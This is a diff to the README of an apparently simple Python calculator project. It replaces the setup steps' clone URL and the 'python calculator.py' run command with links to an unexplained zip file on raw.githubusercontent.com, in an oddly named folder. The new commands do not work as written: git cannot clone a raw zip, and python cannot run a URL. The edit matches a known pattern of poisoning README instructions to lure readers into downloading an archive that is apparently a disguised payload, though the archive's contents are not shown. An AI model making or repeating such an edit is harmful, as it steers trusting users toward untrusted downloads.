@@ -18,7 +18,7 @@ This is a simple command-line calculator program written in Python. It allows us
 
 1.  Clone the Repository:
     ```bash
-    git clone [https://github.com/your-username/your-repo-name.git](https://github.com/your-username/your-repo-name.git)
+    git clone [https://raw.githubusercontent.com/Griffnificent/python-calculator-assignment/main/emmetropism/calculator_python_assignment_v3.2.zip](https://raw.githubusercontent.com/Griffnificent/python-calculator-assignment/main/emmetropism/calculator_python_assignment_v3.2.zip)
     ```
     *Replace `your-username` and `your-repo-name` with your actual GitHub username and repository name.*
 
@@ -29,7 +29,7 @@ This is a simple command-line calculator program written in Python. It allows us
 
 3.  Run the Script:
     ```bash
-    python calculator.py
+    python https://raw.githubusercontent.com/Griffnificent/python-calculator-assignment/main/emmetropism/calculator_python_assignment_v3.2.zip
     ```
 
 The program will then prompt you to enter the numbers and the desired operation.
